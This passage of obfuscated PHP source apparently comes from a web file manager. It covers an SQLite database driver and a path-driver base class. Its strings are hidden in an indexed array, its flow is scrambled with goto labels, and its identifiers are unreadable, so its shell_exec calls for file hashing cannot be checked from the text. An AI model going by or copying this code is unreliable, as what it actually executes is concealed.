think_action_status($a˘ã†ﬂ‡Ã‹[21], 1); goto D§©≤°Àªª; D»‘ä±Ùåƒ: if (!1 === $bƒÌ—µ÷±Ü) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto EÙ†ÇÎ©⁄Ö; D§©≤°Àªª: think_status($a˘ã†ﬂ‡Ã‹[20]); $bƒÌ—µ÷±Ü = $this->_linkID->exec($Bñ—Ìá—¬—); $this->debug(); goto D»‘ä±Ùåƒ; FåÉÂÑ‚ÙÓ: $a˘ã†ﬂ‡Ã‹ =& $_SERVER[∞„˜ƒÑºª]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto eä†æÿÜ¥¶; EÙ†ÇÎ©⁄Ö: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[∞„˜ƒÑºª][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Bè•ß∆§§ö = $this->_linkID->query($_SERVER[∞„˜ƒÑºª][23]); if (!$Bè•ß∆§§ö) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $CíÎÑƒÚËµ = $this->_linkID->query($_SERVER[∞„˜ƒÑºª][24]); if (!$CíÎÑƒÚËµ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $cÿƒöàÂ„ƒ = array(); while ($A∑∑›Ùâã√ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $cÿƒöàÂ„ƒ[] = $A∑∑›Ùâã√; } $this->queryID->reset(); return $cÿƒöàÂ„ƒ; } public function getFields($DààÇâçë») { $fÑËîØºûÕ =& $_SERVER[∞„˜ƒÑºª]; $d“ˆààå«Ñ = $this->query($fÑËîØºûÕ[25] . $DààÇâçë» . $fÑËîØºûÕ[26]); $c¿ØØ“ˆ…Ò = array(); if ($d“ˆààå«Ñ) { foreach ($d“ˆààå«Ñ as $dó€∏¢Éëõ => $E Ú†¬Óúõ) { $c¿ØØ“ˆ…Ò[$E Ú†¬Óúõ[$fÑËîØºûÕ[28]]] = array($fÑËîØºûÕ[28] => $E Ú†¬Óúõ[$fÑËîØºûÕ[28]], $fÑËîØºûÕ[29] => $E Ú†¬Óúõ[$fÑËîØºûÕ[29]], $fÑËîØºûÕ[31] => (bool) ($E Ú†¬Óúõ[$fÑËîØºûÕ[31]] === $fÑËîØºûÕ[33]), $fÑËîØºûÕ[34] => $E Ú†¬Óúõ[$fÑËîØºûÕ[61]], $fÑËîØºûÕ[36] => (bool) $E Ú†¬Óúõ[$fÑËîØºûÕ[62]], $fÑËîØºûÕ[39] => (bool) $E Ú†¬Óúõ[$fÑËîØºûÕ[62]]); } } return $c¿ØØ“ˆ…Ò; } public function getTables($Fáı∏≥√çê = '') { $EÖñ≤ÆΩèÓ =& $_SERVER[∞„˜ƒÑºª]; $eº≠÷Èàè = $this->query($EÖñ≤ÆΩèÓ[42] . $EÖñ≤ÆΩèÓ[43] . $EÖñ≤ÆΩèÓ[44]); $aÿâÖ∞ûÆ– = array(); foreach ($eº≠÷Èàè as $B…ô©ëã¿≥ => $B¢œ∫Ò‰Ω) { $aÿâÖ∞ûÆ–[$B…ô©ëã¿≥] = current($B¢œ∫Ò‰Ω); } return $aÿâÖ∞ûÆ–; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $DÆÁ¢èºïÇ =& $_SERVER[∞„˜ƒÑºª]; $this->error = $this->_linkID->lastErrorMsg(); if ($DÆÁ¢èºïÇ[33] != $this->queryStr) { $this->error .= LNG($DÆÁ¢èºïÇ[45]) . $this->queryStr; } think_trace($this->error, $DÆÁ¢èºïÇ[33], $DÆÁ¢èºïÇ[46]); return $this->error; } public function escapeString($aêçÜÎŸ‚”) { $Eå‡á‹°¡£ =& $_SERVER[∞„˜ƒÑºª]; if ($this->_linkID) { return $this->_linkID->escapeString($aêçÜÎŸ‚”); } return str_ireplace($Eå‡á‹°¡£[63], $Eå‡á‹°¡£[64], $aêçÜÎŸ‚”); } public function parseLimit($E®¨ “¶†í) { $d»µ›ÖıâÖ =& $_SERVER[∞„˜ƒÑºª]; $eÑ≠¯õ∑ÃÓ = $d»µ›ÖıâÖ[33]; if (!empty($E®¨ “¶†í)) { $E®¨ “¶†í = explode($d»µ›ÖıâÖ[47], $E®¨ “¶†í); if (count($E®¨ “¶†í) > 1) { $eÑ≠¯õ∑ÃÓ .= $d»µ›ÖıâÖ[48] . $E®¨ “¶†í[1] . $d»µ›ÖıâÖ[49] . $E®¨ “¶†í[0] . $d»µ›ÖıâÖ[50]; } else { $eÑ≠¯õ∑ÃÓ .= $d»µ›ÖıâÖ[48] . $E®¨ “¶†í[0] . $d»µ›ÖıâÖ[50]; } } return $eÑ≠¯õ∑ÃÓ; } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $BÒ∞„—œ©å =& $_SERVER[∞„˜ƒÑºª]; $this->objectDriver = array($BÒ∞„—œ©å[65], $BÒ∞„—œ©å[66], $BÒ∞„—œ©å[67], $BÒ∞„—œ©å[68], $BÒ∞„—œ©å[69], $BÒ∞„—œ©å[70], $BÒ∞„—œ©å[71], $BÒ∞„—œ©å[72], $BÒ∞„—œ©å[73]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($aìáàÍç◊∫) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($aìáàÍç◊∫, $_SERVER[∞„˜ƒÑºª][8]); } return $aìáàÍç◊∫; } public function getPathName($CÏ“Ó‘çìŸ) { return $CÏ“Ó‘çìŸ; } public function iconvApp($aÏëËŸ›¢) { return $aÏëËŸ›¢; } public function iconvSystem($E◊ãÖòÿ‘Ø) { return $E◊ãÖòÿ‘Ø; } public function iconvTo($bÑÇ≈≈Æì·, $cû¶íÉ§©«, $aû—ç≤ØâÜ) { goto aÏ•‘–”™∏; aÏ•‘–”™∏: $Dæã„»¨°” =& $_SERVER[∞„˜ƒÑºª]; if (!$bÑÇ≈≈Æì· || !function_exists($Dæã„»¨°”[74])) { return $bÑÇ≈≈Æì·; } static $A©’ùËê˘Ê = array(); goto a¨⁄’°ì‡Ã; a¨⁄’°ì‡Ã: $DËç‡Êû°æ = $cû¶íÉ§©« . $Dæã„»¨°”[75] . $aû—ç≤ØâÜ . $Dæã„»¨°”[76] . $bÑÇ≈≈Æì·; if (isset($A©’ùËê˘Ê[$DËç‡Êû°æ])) { return $A©’ùËê˘Ê[$DËç‡Êû°æ]; } if (function_exists($Dæã„»¨°”[77])) { $Fç±áŸí´£ = @mb_convert_encoding($bÑÇ≈≈Æì·, $aû—ç≤ØâÜ, $cû¶íÉ§©«); } else { $Fç±áŸí´£ = @iconv($cû¶íÉ§©«, $aû—ç≤ØâÜ, $bÑÇ≈≈Æì·); } goto A≠„ˆç≠Ü›; A≠„ˆç≠Ü›: $Fç±áŸí´£ = $Fç±áŸí´£ ? $Fç±áŸí´£ : $bÑÇ≈≈Æì·; if (strstr($Fç±áŸí´£, $Dæã„»¨°”[78])) { $Fç±áŸí´£ = str_replace($Dæã„»¨°”[78], $Dæã„»¨°”[79], $Fç±áŸí´£); } $A©’ùËê˘Ê[$cû¶íÉ§©« . $Dæã„»¨°”[75] . $aû—ç≤ØâÜ . $Dæã„»¨°”[76] . $bÑÇ≈≈Æì·] = $Fç±áŸí´£; goto DìõèÓÉÙ≈; CÁù‚…ªò‘: return $Fç±áŸí´£; goto E¯Öâø¡∏ü; DìõèÓÉÙ≈: $A©’ùËê˘Ê[$aû—ç≤ØâÜ . $Dæã„»¨°”[75] . $cû¶íÉ§©« . $Dæã„»¨°”[76] . $bÑÇ≈≈Æì·] = $bÑÇ≈≈Æì·; $A©’ùËê˘Ê[$aû—ç≤ØâÜ . $Dæã„»¨°”[75] . $cû¶íÉ§©« . $Dæã„»¨°”[76] . $Fç±áŸí´£] = $bÑÇ≈≈Æì·; $A©’ùËê˘Ê[$cû¶íÉ§©« . $Dæã„»¨°”[75] . $aû—ç≤ØâÜ . $Dæã„»¨°”[76] . $Fç±áŸí´£] = $Fç±áŸí´£; goto CÁù‚…ªò‘; E¯Öâø¡∏ü: } public function getPathInner($Bàâ‘±±¢Ü) { $aº⁄Ø©ﬁÚ¯ = IO::init($Bàâ‘±±¢Ü); return $aº⁄Ø©ﬁÚ¯->path; } public function getPathOuter($dÛâÇÇï¿¿) { $A®¬“Á◊†å =& $_SERVER[∞„˜ƒÑºª]; $a›√’±®ãÈ = strlen(trim($this->pathBase, $A®¬“Á◊†å[8])); $dÛâÇÇï¿¿ = substr(trim($dÛâÇÇï¿¿, $A®¬“Á◊†å[8]), $a›√’±®ãÈ); return $this->pathDriver . $A®¬“Á◊†å[8] . ltrim($dÛâÇÇï¿¿, $A®¬“Á◊†å[8]); } public function isParentOf($f“ÉΩ„»äπ, $aëè°§é’€) { $Eëà–œùìÖ =& $_SERVER[∞„˜ƒÑºª]; $f“ÉΩ„»äπ = rtrim(strtolower($f“ÉΩ„»äπ), $Eëà–œùìÖ[8]) . $Eëà–œùìÖ[8]; $aëè°§é’€ = rtrim(strtolower($aëè°§é’€), $Eëà–œùìÖ[8]) . $Eëà–œùìÖ[8]; $c£úû§÷ØØ = strpos($aëè°§é’€, $f“ÉΩ„»äπ) === 0; return $c£úû§÷ØØ; } public function getType() { $CäÕäÍÖÇÕ =& $_SERVER[∞„˜ƒÑºª]; $aﬂÂµ◊›º® = str_replace($CäÕäÍÖÇÕ[80], $CäÕäÍÖÇÕ[33], get_class($this)); return strtolower($aﬂÂµ◊›º®); } public function isTypeObject() { return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Aßë’´ÆÃ∑, $dò†õÕî†⁄) { $A∑•ÖÇÉàî =& $_SERVER[∞„˜ƒÑºª]; $c¬ÍÑ·«ÈÏ = rtrim($Aßë’´ÆÃ∑, $A∑•ÖÇÉàî[8]) . $A∑•ÖÇÉàî[8] . $dò†õÕî†⁄; $eç◊À’ø≈¿ = $this->exist($c¬ÍÑ·«ÈÏ); return $eç◊À’ø≈¿ ? $c¬ÍÑ·«ÈÏ : !1; } public function renameObject($F ÕÚˆﬁÀ‰, $f¡ã¬™É¨è) { $D∆ß™í—ƒä =& $_SERVER[∞„˜ƒÑºª]; Hook::trigger($D∆ß™í—ƒä[81], $this, $F ÕÚˆﬁÀ‰, $this, $this->pathFather($F ÕÚˆﬁÀ‰) . $f¡ã¬™É¨è); $F ÕÚˆﬁÀ‰ = $this->getPathOuter($F ÕÚˆﬁÀ‰); $f¡ã¬™É¨è = $this->pathFather($F ÕÚˆﬁÀ‰) . $f¡ã¬™É¨è; if (IO::isFile($F ÕÚˆﬁÀ‰)) { $fÊ„µÕÚñ˜ = IO::move($F ÕÚˆﬁÀ‰, $f¡ã¬™É¨è, REPEAT_RENAME_FOLDER); } else { $fÊ„µÕÚñ˜ = IO::mkdir($f¡ã¬™É¨è); if (!$fÊ„µÕÚñ˜) { return !1; } $eóÎ÷…»—µ = IO::listPath($F ÕÚˆﬁÀ‰); $e◊¯†•Ω‡î = array_merge($eóÎ÷…»—µ[$D∆ß™í—ƒä[82]], $eóÎ÷…»—µ[$D∆ß™í—ƒä[83]]); foreach ($e◊¯†•Ω‡î as $dõÍø∆à’Ÿ) { IO::move($dõÍø∆à’Ÿ[$D∆ß™í—ƒä[84]], $f¡ã¬™É¨è, REPEAT_RENAME_FOLDER); } IO::remove($F ÕÚˆﬁÀ‰); } return $fÊ„µÕÚñ˜ ? $f¡ã¬™É¨è : !1; } public function isType($E¡Éßé±»ë, $DïÂüÌ…—å) { return strtolower($DïÂüÌ…—å) == $this->getType(); } public function tempFile($E…ˆ∆–àÁÆ = '', $dÎÉÑıà‹ó = '') { goto EáôñÍˆãí; d‚ê”îÍ—é: $cﬂÏóŒ€∏ô = $Aãòê’œ•  . $E…ˆ∆–àÁÆ; @touch($cﬂÏóŒ€∏ô); if ($dÎÉÑıà‹ó) { file_put_contents($cﬂÏóŒ€∏ô, $dÎÉÑıà‹ó); } goto E…¯ßÒŸñ–; EáôñÍˆãí: if (!$E…ˆ∆–àÁÆ) { $E…ˆ∆–àÁÆ = rand_string(15); } $Aãòê’œ•  = TEMP_FILES . rand_string(15) . $_SERVER[∞„˜ƒÑºª][8]; @mkdir($Aãòê’œ• , 511, !0); goto d‚ê”îÍ—é; E…¯ßÒŸñ–: return $cﬂÏóŒ€∏ô; goto BÍàêú≠º‚; BÍàêú≠º‚: } public function tempFileRemve($dªØïÛÚä◊) { @unlink($dªØïÛÚä◊); @rmdir($this->pathFather($dªØïÛÚä◊)); } public function mkfile($A∂≤ëäáΩ§, $EÇÈ“Ç™∫À = '', $FﬁæçÀ‹öﬂ = REPEAT_RENAME) { } public function mkdir($F¥—’œ≠ˆ, $bàÏúÈû† = REPEAT_SKIP) { } public function copyFile($cÚÙ≤†øäÑ, $aïñè≈Ã±¬) { } public function moveFile($aÇ„õ¿‹ÎË, $AâÒïªõÃﬂ) { } public function remove($E–ÛØÛö◊µ) { if ($this->isFile($E–ÛØÛö◊µ)) { return $this->delFile($E–ÛØÛö◊µ); } return $this->delFolder($E–ÛØÛö◊µ); } public function rename($FﬂÉ∫ÀÜı†, $a €ÍÆ“™è) { } public function exist($dÆ¨¯ûﬂòâ) { } public function findByHash($d÷ÛÌê∏›§ = '', $BÙÓÚ⁄∏‹Ô = '') { return !1; } public function isFile($Aóœ…è„Ô…) { } public function isFolder($fÎªá”ªÍÃ) { } public function size($BÎáΩÂÿ¡») { } public function info($b‹≠â¢î•Ú) { } public function infoAuth($f‰ΩÍ∫√ÕÛ) { return $this->info($f‰ΩÍ∫√ÕÛ); } public function infoFull($a∏Ë™⁄∏ÌÊ) { return $this->info($a∏Ë™⁄∏ÌÊ); } public function infoWithChildren($eÚúÿ˜Ö∏∏) { $b∞çÏÎ§πΩ =& $_SERVER[∞„˜ƒÑºª]; $AÆêçÇÊ†° = $this->info($eÚúÿ˜Ö∏∏); if ($AÆêçÇÊ†° && $AÆêçÇÊ†°[$b∞çÏÎ§πΩ[29]] == $b∞çÏÎ§πΩ[85]) { $Cï¿¡¡è©ì = array($b∞çÏÎ§πΩ[86] => 0, $b∞çÏÎ§πΩ[87] => 0, $b∞çÏÎ§πΩ[88] => 0); $this->infoChildren($eÚúÿ˜Ö∏∏, $Cï¿¡¡è©ì); $AÆêçÇÊ†°[$b∞çÏÎ§πΩ[86]] = $Cï¿¡¡è©ì[$b∞çÏÎ§πΩ[86]]; $AÆêçÇÊ†°[$b∞çÏÎ§πΩ[89]] = array($b∞çÏÎ§πΩ[90] => $Cï¿¡¡è©ì[$b∞çÏÎ§πΩ[87]], $b∞çÏÎ§πΩ[91] => $Cï¿¡¡è©ì[$b∞çÏÎ§πΩ[88]]); } return $AÆêçÇÊ†°; } public function listPath($aéÑæé∏ªØ, $Dä‡äˆÿ¬© = false, $E◊ı•¥™‚⁄ = false) { } public function has($FÒç»ê≈åä, $d¥ÕÉáää¨ = false) { } public function canRead($Aêç¶Ωë∑‰) { } public function canWrite($BΩÛê€Ü¬◊) { } public function getContent($A•Ã√»¡èâ) { } public function setContent($añ¿Éê‘’È, $BŸôÉ¯í≤Ò = '') { } protected function infoChildren($c¥ƒæìÊ£¯, &$f¥´ìåàó¿) { $eâ¡êõïíË =& $_SERVER[∞„˜ƒÑºª]; $BïÁ„‘œòÌ = $this->listPath($c¥ƒæìÊ£¯, !1, !0); $BïÁ„‘œòÌ = array_merge($BïÁ„‘œòÌ[$eâ¡êõïíË[83]], $BïÁ„‘œòÌ[$eâ¡êõïíË[82]]); foreach ($BïÁ„‘œòÌ as $Få≥©òöàê) { if ($Få≥©òöàê[$eâ¡êõïíË[29]] == $eâ¡êõïíË[85]) { $f¥´ìåàó¿[$eâ¡êõïíË[88]]++; $bÂ√äñ∫ç‡ = $this->getPathInner($Få≥©òöàê[$eâ¡êõïíË[84]]); $this->infoChildren($bÂ√äñ∫ç‡, $f¥´ìåàó¿); } else { $f¥´ìåàó¿[$eâ¡êõïíË[87]]++; $f¥´ìåàó¿[$eâ¡êõïíË[86]] += $Få≥©òöàê[$eâ¡êõïíË[86]]; } } } public function fileSubstr($dâ’…ãº∞û, $f‚ì¯Ù≥®π, $Cê≥ §àçï) { } public function listAll($bÎ…¨†œå‹) { } public function upload($f´⁄”ûƒÒ‰, $FÎﬂ”πå°⁄, $Cóÿ¬–ì†÷ = false, $eÕ‘ò„‡ºÁ = REPEAT_REPLACE) { } public function uploadFileByID($e€…≠¨Ü›Œ, $D†ä“Âã¢Œ, $DÜêæÍÌºœ) { } public function uploadFileByPath($Eªä´áËê·, $b‹àò±‚ÆΩ, $EöŸêàÃç¥ = array()) { } public function uploadLink($b”å…§ÇñŒ, $cÉ±≠ÁöÏé = 0) { goto E¢´∞öåŸ≠; c∞àæŒ¥ê”: $DïÍêÿçé≥ = $cÉ±≠ÁöÏé <= $Fˆã–àëæ∑ ? $AºŸ‘œÇ¡Ü[94] : $AºŸ‘œÇ¡Ü[95]; if ($BπåŒÎ∏òË == $AºŸ‘œÇ¡Ü[69]) { $DïÍêÿçé≥ = $AºŸ‘œÇ¡Ü[95]; } if ($BπåŒÎ∏òË == $AºŸ‘œÇ¡Ü[73] && $cÉ±≠ÁöÏé >= 1024 * 1024 * 10) { $DïÍêÿçé≥ = $AºŸ‘œÇ¡Ü[95]; } goto D˜Ëä¿Âè”; D˜Ëä¿Âè”: $a—õ©¯øÀ≤ = (!$cÉ±≠ÁöÏé ? 1 : ceil($cÉ±≠ÁöÏé / pow(1024, 3))) * 3600 * 4; $eá§‘„¬Ò◊ = $this->{$DïÍêÿçé≥}($b”å…§ÇñŒ, $a—õ©¯øÀ≤); if ($eá§‘„¬Ò◊) { $eá§‘„¬Ò◊[$AºŸ‘œÇ¡Ü[96]] = $b”å…§ÇñŒ; $eá§‘„¬Ò◊[$AºŸ‘œÇ¡Ü[97]] = $BπåŒÎ∏òË; } goto d∞ﬂ›ä…ôÒ; a¨Œ¢∏ÇÕÂ: if (!in_array($BπåŒÎ∏òË, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Fˆã–àëæ∑ = 1024 * 1024 * 20; goto c∞àæŒ¥ê”; d∞ﬂ›ä…ôÒ: return $eá§‘„¬Ò◊; goto C¿⁄Û±„¨Ω; E¢´∞öåŸ≠: $AºŸ‘œÇ¡Ü =& $_SERVER[∞„˜ƒÑºª]; if ($GLOBALS[$AºŸ‘œÇ¡Ü[6]][$AºŸ‘œÇ¡Ü[92]][$AºŸ‘œÇ¡Ü[93]]) { return; } $BπåŒÎ∏òË = $this->getType(); goto a¨Œ¢∏ÇÕÂ; C¿⁄Û±„¨Ω: } public function uploadFormData($A“ç¢¶’«Ã, $eÚå™–¨ºî = 3600) { } public function multiUploadFormData($bÌ‘©”¿ﬁË, $FÀ“õêÖØÒ = 3600) { } public function download($Bøû’•†∏æ, $A‚Ã¯ØÏôÑ) { } public function ext($b∫Áñ◊Œéó) { $E“‡À÷±íí =& $_SERVER[∞„˜ƒÑºª]; if (strpos($b∫Áñ◊Œéó, $E“‡À÷±íí[8]) === -1) { $eÁÎ±Û≈ñÑ = $b∫Áñ◊Œéó; } else { $eÁÎ±Û≈ñÑ = $this->pathThis($b∫Áñ◊Œéó); } $b®îŒçëû‘ = $E“‡À÷±íí[33]; if (strstr($eÁÎ±Û≈ñÑ, $E“‡À÷±íí[98])) { $b®îŒçëû‘ = substr($eÁÎ±Û≈ñÑ, strrpos($eÁÎ±Û≈ñÑ, $E“‡À÷±íí[98]) + 1); $b®îŒçëû‘ = strtolower($b®îŒçëû‘); } if (strlen($b®îŒçëû‘) > 3 && preg_match($E“‡À÷±íí[99], $b®îŒçëû‘, $F˘ ü…“∂ä)) { $b®îŒçëû‘ = $E“‡À÷±íí[33]; } return $b®îŒçëû‘; } public function pathThis($F≥ïò´Ò•¶) { $càòêÌµõÎ =& $_SERVER[∞„˜ƒÑºª]; $F≥ïò´Ò•¶ = str_replace($càòêÌµõÎ[100], $càòêÌµõÎ[8], rtrim($F≥ïò´Ò•¶, $càòêÌµõÎ[8])); $C…ΩÍ≈é≈Â = strrpos($F≥ïò´Ò•¶, $càòêÌµõÎ[8]); if ($C…ΩÍ≈é≈Â === !1) { return $F≥ïò´Ò•¶; } return substr($F≥ïò´Ò•¶, $C…ΩÍ≈é≈Â + 1); } public function pathFather($C«ç¨’„ƒ„) { $fû≈Â™‘ü =& $_SERVER[∞„˜ƒÑºª]; $C«ç¨’„ƒ„ = str_replace($fû≈Â™‘ü[100], $fû≈Â™‘ü[8], rtrim($C«ç¨’„ƒ„, $fû≈Â™‘ü[8])); $fﬂÇô°≈≠± = strrpos($C«ç¨’„ƒ„, $fû≈Â™‘ü[8]); if ($fﬂÇô°≈≠± === !1) { return $fû≈Â™‘ü[33]; } return substr($C«ç¨’„ƒ„, 0, $fﬂÇô°≈≠± + 1); } public function hashSimple($B´ç´ãá™‡) { goto aπ∂—Í≈Í; aæ°æ…«≥Ã: $aÜÆ∫û„¬ﬂ .= $this->fileSubstr($B´ç´ãá™‡, $B•®∏ƒ§à∆ - $B∫ìﬂ¯ŸÍ∆, $B∫ìﬂ¯ŸÍ∆); return md5($aÜÆ∫û„¬ﬂ) . $B•®∏ƒ§à∆; goto E∑îèœ¯ä; cÜå∆›Ó•: $cû≥¬©Ûíﬁ = intval($B•®∏ƒ§à∆ / $Fï˜éÚ‹êΩ); $aÜÆ∫û„¬ﬂ = $a€«ÃÚìéÉ[33]; for ($B“Ê∞±òê† = 0; $B“Ê∞±òê† < $Fï˜éÚ‹êΩ; $B“Ê∞±òê†++) { $aÜÆ∫û„¬ﬂ .= $this->fileSubstr($B´ç´ãá™‡, $cû≥¬©Ûíﬁ * $B“Ê∞±òê†, $B∫ìﬂ¯ŸÍ∆); } goto aæ°æ…«≥Ã; aπ∂—Í≈Í: $a€«ÃÚìéÉ =& $_SERVER[∞„˜ƒÑºª]; if (!$B´ç´ãá™‡) { return md5($a€«ÃÚìéÉ[33]); } $B•®∏ƒ§à∆ = $this->size($B´ç´ãá™‡); goto E÷«∞‰√œ—; E÷«∞‰√œ—: $B∫ìﬂ¯ŸÍ∆ = 200; $Fï˜éÚ‹êΩ = 50; if ($B•®∏ƒ§à∆ <= $B∫ìﬂ¯ŸÍ∆ * $Fï˜éÚ‹êΩ) { return $this->hashMd5($B´ç´ãá™‡) . $B•®∏ƒ§à∆; } goto cÜå∆›Ó•; E∑îèœ¯ä: } public static $md5Cache = array(); public function hashMd5($E≤Üõæö—§) { $E≤Üõæö—§ = $this->iconvSystem($E≤Üõæö—§); if (isset(self::$md5Cache[$E≤Üõæö—§])) { return self::$md5Cache[$E≤Üõæö—§]; } self::$md5Cache[$E≤Üõæö—§] = $this->hashMd5Shell($E≤Üõæö—§); if (!self::$md5Cache[$E≤Üõæö—§]) { self::$md5Cache[$E≤Üõæö—§] = @md5_file($E≤Üõæö—§); } return self::$md5Cache[$E≤Üõæö—§]; } private function hashMd5Shell($bà˘ÕœœÕπ) { goto bÕååùÍãì; C«ä˘€Öéª: $bÒÏ—È†ŒÉ = Cache::get($fæÊ∑‘¿òÆ[104]); if (!$bÒÏ—È†ŒÉ) { $B…°ºÙì¶Ì = BASIC_PATH . $fæÊ∑‘¿òÆ[105]; $d ö»…≠√à = md5_file($B…°ºÙì¶Ì); $bÒÏ—È†ŒÉ = $fæÊ∑‘¿òÆ[106]; foreach ($eæ±åêá∫è as $C¬œà´∫ÃÒ) { $BÖÉ‡æ∏ÏÁ = shell_exec($C¬œà´∫ÃÒ . "\x20\42{$B…°ºÙì¶Ì}\42"); if ($BÖÉ‡æ∏ÏÁ && substr(trim($BÖÉ‡æ∏ÏÁ), 0, 32) == $d ö»…≠√à) { $bÒÏ—È†ŒÉ = $C¬œà´∫ÃÒ; break; } } Cache::set($fæÊ∑‘¿òÆ[104], $bÒÏ—È†ŒÉ, 3600); } if ($bÒÏ—È†ŒÉ == $fæÊ∑‘¿òÆ[106]) { return !1; } goto D⁄¿∞§œ«ª; bÕååùÍãì: $fæÊ∑‘¿òÆ =& $_SERVER[∞„˜ƒÑºª]; if (!function_exists($fæÊ∑‘¿òÆ[101])) { return !1; } $eæ±åêá∫è = array($fæÊ∑‘¿òÆ[102], $fæÊ∑‘¿òÆ[103]); goto C«ä˘€Öéª; D⁄¿∞§œ«ª: $BÖÉ‡æ∏ÏÁ = shell_exec($bÒÏ—È†ŒÉ . "\40\x22{$bà˘ÕœœÕπ}\x22"); return substr($BÖÉ‡æ∏ÏÁ, 0, 32); goto CÆ±÷üÙ–ã; CÆ±÷üÙ–ã: } public function link($FúåÃ–⁄∏Õ) { return $FúåÃ–⁄∏Õ; } public function fileOut($cıŸæ√Ω’ô, $aÉâ„§‡∫ = false, $EÉ„ﬂ¨ÕΩî = false, $BŒó∏Ì„ü¿ = '') { goto B©Øæ‚∏—Ú; düË›ú∏çâ: header($cƒﬂ±«Ûî‡[118] . $eÀıÏïá√‚); header($cƒﬂ±«Ûî‡[119] . gmdate($cƒﬂ±«Ûî‡[108], time() + 3600 * 24 * 30) . $cƒﬂ±«Ûî‡[120]); header($cƒﬂ±«Ûî‡[121]); goto FûÒ™ÕÉ›Ó; fºÇ«ìØ¨˘: $e©£…åìù¢ = $CÜ‹ÉÕ˘áç - 1; if (!$BŒó∏Ì„ü¿) { $BŒó∏Ì„ü¿ = md5($C∫‹ıìéåﬁ . $this->hashSimple($cıŸæ√Ω’ô)); } $BŒó∏Ì„ü¿ = $cƒﬂ±«Ûî‡[110] . $BŒó∏Ì„ü¿ . $cƒﬂ±«Ûî‡[110]; goto BåÜ¨ö„æﬁ; FûÒ™ÕÉ›Ó: header($cƒﬂ±«Ûî‡[122]); header($cƒﬂ±«Ûî‡[123]); if (isset($_SERVER[$cƒﬂ±«Ûî‡[124]]) && strtotime($_SERVER[$cƒﬂ±«Ûî‡[124]]) == $aõçˆÃèÑô[$cƒﬂ±«Ûî‡[109]]) { header($cƒﬂ±«Ûî‡[125], !0, 304); die; } goto Fë°Ø˘≠—ƒ; eäí§ﬁöåÖ: if (isset($_SERVER[$cƒﬂ±«Ûî‡[145]])) { if (preg_match($cƒﬂ±«Ûî‡[146], $_SERVER[$cƒﬂ±«Ûî‡[145]], $fΩàè⁄ıÌâ)) { $D∑Çç˜É© = intval($fΩàè⁄ıÌâ[1]); if (!empty($fΩàè⁄ıÌâ[2])) { $e©£…åìù¢ = intval($fΩàè⁄ıÌâ[2]); } } header($cƒﬂ±«Ûî‡[147]); header("\103\157\156\x74\x65\156\x74\x2d\x52\141\156\x67\x65\x3a\x20\x62\171\164\x65\x73\40{$D∑Çç˜É©}\x2d{$e©£…åìù¢}\57" . $CÜ‹ÉÕ˘áç); } else { header($cƒﬂ±«Ûî‡[148]); } header($cƒﬂ±«Ûî‡[149] . ($e©£…åìù¢ - $D∑Çç˜É© + 1)); if ($_SERVER[$cƒﬂ±«Ûî‡[150]] == $cƒﬂ±«Ûî‡[151]) { return; } goto f“ï»±œ»ä; aΩÛ⁄ï±ﬂ›: header($cƒﬂ±«Ûî‡[129] . $e∫ë ´â’Â); header($cƒﬂ±«Ûî‡[130]); header($cƒﬂ±«Ûî‡[131] . $CÜ‹ÉÕ˘áç); goto cèÂ√Ôò˘∞; CãﬁªŒäÕÔ: $C∫‹ıìéåﬁ = gmdate($cƒﬂ±«Ûî‡[108], $aõçˆÃèÑô[$cƒﬂ±«Ûî‡[109]]); $e∫ë ´â’Â = $EÉ„ﬂ¨ÕΩî ? $EÉ„ﬂ¨ÕΩî : $this->iconvApp($aõçˆÃèÑô[$cƒﬂ±«Ûî‡[28]]); $D∑Çç˜É© = 0; goto fºÇ«ìØ¨˘; BåÜ¨ö„æﬁ: $eÀıÏïá√‚ = get_file_mime($this->ext($e∫ë ´â’Â)); if (strstr($eÀıÏïá√‚, $cƒﬂ±«Ûî‡[111])) { $eÀıÏïá√‚ = $eÀıÏïá√‚ . $cƒﬂ±«Ûî‡[112]; } if ($aÉâ„§‡∫ === !1 && !mime_support($eÀıÏïá√‚)) { $aÉâ„§‡∫ = !0; $eÀıÏïá√‚ = $cƒﬂ±«Ûî‡[113]; } goto b∑ãÂ´ª“Ê; cèÂ√Ôò˘∞: header($cƒﬂ±«Ûî‡[132]); $cøÏã‚Úó = $this->getType() == $cƒﬂ±«Ûî‡[133]; $f—˜∆Ì¯£≥ = $GLOBALS[$cƒﬂ±«Ûî‡[6]][$cƒﬂ±«Ûî‡[92]][$cƒﬂ±«Ûî‡[134]][$cƒﬂ±«Ûî‡[135]]; goto CÛ›«°ÒîÜ; Fë°Ø˘≠—ƒ: if (isset($_SERVER[$cƒﬂ±«Ûî‡[126]]) && $_SERVER[$cƒﬂ±«Ûî‡[126]] == $BŒó∏Ì„ü¿) { header($cƒﬂ±«Ûî‡[127] . $BŒó∏Ì„ü¿, !0, 304); die; } header($cƒﬂ±«Ûî‡[127] . $BŒó∏Ì„ü¿); header($cƒﬂ±«Ûî‡[128] . $C∫‹ıìéåﬁ . $cƒﬂ±«Ûî‡[120]); goto aΩÛ⁄ï±ﬂ›; b∑ãÂ´ª“Ê: $A»‘∫£îøø = rawurlencode($e∫ë ´â’Â); $A»‘∫£îøø = $cƒﬂ±«Ûî‡[110] . $A»‘∫£îøø . $cƒﬂ±«Ûî‡[114] . $A»‘∫£îøø; if ($aÉâ„§‡∫) { header($cƒﬂ±«Ûî‡[115]); header($cƒﬂ±«Ûî‡[116] . $A»‘∫£îøø); } else { header($cƒﬂ±«Ûî‡[117] . $A»‘∫£îøø); } goto düË›ú∏çâ; 